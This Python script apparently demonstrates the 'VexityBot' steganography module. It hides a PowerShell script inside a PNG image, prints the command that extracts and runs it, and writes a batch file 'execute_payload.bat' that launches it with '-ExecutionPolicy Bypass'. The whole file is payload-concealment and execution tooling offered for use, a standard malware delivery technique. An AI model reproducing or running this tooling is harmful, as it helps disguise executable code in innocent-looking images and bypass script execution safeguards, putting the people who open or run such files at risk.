# ADDED - VexityBot Steganography Example
# This script demonstrates how to use the steganography functionality
# with the provided momo.png image

import os
from VexityBotSteganography import VexityBotSteganography

def main():
    """Main example function"""
    print("🖼️ VexityBot Steganography Example")
    print("=" * 40)
    
    # Initialize steganography system
    stego = VexityBotSteganography()
    
    # Paths
    image_path = "imagecoded/momo.png"
    script_path = "calc.ps1"
    output_path = "imagecoded/momo_with_script.png"
    
    # Check if files exist
    if not os.path.exists(image_path):
        print(f"❌ Image file not found: {image_path}")
        return
    
    if not os.path.exists(script_path):
        print(f"❌ Script file not found: {script_path}")
        return
    
    try:
        # Validate the image
        print(f"🔍 Validating image: {image_path}")
        is_valid, message = stego.validate_image(image_path)
        if not is_valid:
            print(f"❌ Image validation failed: {message}")
            return
        
        print(f"✅ Image validation passed: {message}")
        
        # Get maximum script size
        max_size = stego.get_max_script_size(image_path)
        print(f"📏 Maximum script size: {max_size} bytes ({max_size // 1024} KB)")
        
        # Check script size
        script_size = os.path.getsize(script_path)
        print(f"📄 Script size: {script_size} bytes")
        
        if script_size > max_size:
            print(f"❌ Script too large for image. Max: {max_size}, Script: {script_size}")
            return
        
        # Hide script in image
        print(f"🔒 Hiding script in image...")
        ps_command = stego.hide_script_in_image(script_path, image_path, output_path)
        
        print(f"✅ Script successfully hidden in image!")
        print(f"📁 Output image: {output_path}")
        print(f"📏 Image size: {os.path.getsize(output_path)} bytes")
        
        # Display the PowerShell execution command
        print("\n" + "=" * 50)
        print("🚀 POWERSHELL EXECUTION COMMAND:")
        print("=" * 50)
        print(ps_command)
        print("=" * 50)
        
        # Create a batch file for easy execution
        batch_content = f'''@echo off
echo VexityBot Steganography Payload Executor
echo ======================================
echo.
echo Executing hidden script from image...
echo.
powershell.exe -ExecutionPolicy Bypass -Command "{ps_command.replace(chr(10), '; ')}"
echo.
echo Execution completed.
pause
'''
        
        batch_path = "imagecoded/execute_payload.bat"
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        print(f"\n📝 Batch file created: {batch_path}")
        print("\n🎯 To execute the hidden script:")
        print(f"   1. Run: {batch_path}")
        print(f"   2. Or copy the PowerShell command above")
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")

if __name__ == "__main__":
    main()
